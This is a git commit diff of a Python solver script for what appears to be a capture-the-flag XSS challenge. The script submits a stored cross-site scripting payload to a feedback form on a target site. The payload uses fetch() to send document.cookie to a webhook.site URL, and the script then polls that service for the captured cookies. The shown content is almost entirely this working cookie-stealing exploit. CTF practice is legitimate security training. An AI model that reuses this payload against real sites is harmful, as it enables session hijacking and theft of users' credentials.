e3a159070dd90a7247c507b08d6e53634e8e55d7
SAW <99191294+nicsaw@users.noreply.github.com>
2025-05-14 02:20:52 +1000

    Fetch: simplify

--- ctf/4-XSS/fetch.py
+++ ctf/4-XSS/fetch.py
@@ -1,36 +1,21 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, find_flag
+from utils import get_session, WebhookSite
 
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.webhooksite_uuid = self.get_webhooksite_uuid()
-        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
-        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
-        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
-
-    def get_webhooksite_uuid(self):
-        response = self.session.post("https://webhook.site/token")
-        return response.json()["uuid"]
-
-    def find_flag_webhooksite(self, delay_seconds=2.5):
-        import time, json
-        time.sleep(delay_seconds)
-        response = self.session.get(self.webhooksite_requests_url)
-        response_json = response.json()
-        response_json_text = json.dumps(response_json, indent=2)
-        find_flag(response_json_text)
+        self.webhooksite = WebhookSite()
 
     def main(self):
         BASE_URL = "https://fetch.quoccacorp.com"
-        PAYLOAD = f'''</script><script>fetch(`{self.webhooksite_url}?q=${{document.cookie}}`)</script>'''
+        PAYLOAD = f'''</script><script>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)</script>'''
 
         response = self.session.post(BASE_URL, json={"who": PAYLOAD, "why": PAYLOAD})
         view_feedback_url = response.json().get("success").split(' ')[-1]
 
-        self.find_flag_webhooksite()
+        self.webhooksite.find_flags()
 
 if __name__ == "__main__":
     Solver().main()
